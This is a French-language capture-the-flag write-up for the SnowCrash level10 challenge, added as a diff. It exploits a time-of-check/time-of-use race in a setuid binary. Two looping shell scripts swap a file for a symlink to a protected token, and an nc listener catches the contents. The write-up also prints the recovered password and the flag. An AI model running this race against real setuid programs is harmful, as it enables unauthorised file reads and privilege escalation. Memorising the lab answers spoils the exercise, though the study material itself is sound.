@@ -1,0 +1,62 @@
+On commence ici par faire un strings sur level10, on vois alors qu'il se sert de access puis de open pour ouvrir le fichier qu'on lui
+passe en argument, on remarque aussi qu'il essaye absolument d'envoyer sur le port 6969 de l'adresse qu'on lui passe en paramètre.
+La solution serait de changer le fichier que le programme ouvre via un lien symbolique entre l'access et l'open, pour cela on peut faire
+tourner en boucle deux scripts qui seront chargés le premier, de créer un fichier, de le supprimer puis de faire un lien symbolique
+vers le fichier sur lequel nous n'avons pas les droits et le deuxième se contentera de lancer l'executable en boucle, on aura bien
+sur une troisième console d'ouverte avec nc en écoute sur le port 6969 pour récupérer le contenu du fichier.
+level10@SnowCrash:/tmp/tettouat$ vim file.sh
+#!/bin/sh
+while [ 1 ]
+do
+        rm -rf /tmp/tettouat/token
+        touch /tmp/tettouat/token
+        rm -rf /tmp/tettouat/token
+        ln -s ~/token /tmp/tettouat/token
+done
+
+level10@SnowCrash:/tmp/tettouat$ vim exe.sh
+#!/bin/sh
+while [ 1 ]
+do
+        ~/level10 /tmp/tettouat/token 0
+done
+
+un petit chmod +x sur les .sh
+et on execute file.sh
+dans une autre console
+level10@SnowCrash:/tmp/tettouat$ while true; do nc -l 6969; done
+
+Puis on execute exe.sh
+level10@SnowCrash:/tmp/tettouat$ ./exe.sh
+...
+Connecting to 0:6969 .. Connected!
+Sending file .. Damn. Unable to open file
+You don't have access to /tmp/tettouat/token
+You don't have access to /tmp/tettouat/token
+Connecting to 0:6969 .. Connected!
+Sending file .. Damn. Unable to open file
+You don't have access to /tmp/tettouat/token
+You don't have access to /tmp/tettouat/token
+Connecting to 0:6969 .. Connected!
+Sending file .. wrote file!
+...
+
+et même temps dans la console de nc apparait:
+...
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+...
+
+Cela défile très vite!
+level10@SnowCrash:/tmp/tettouat$ su flag10
+Password:
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+Voila!
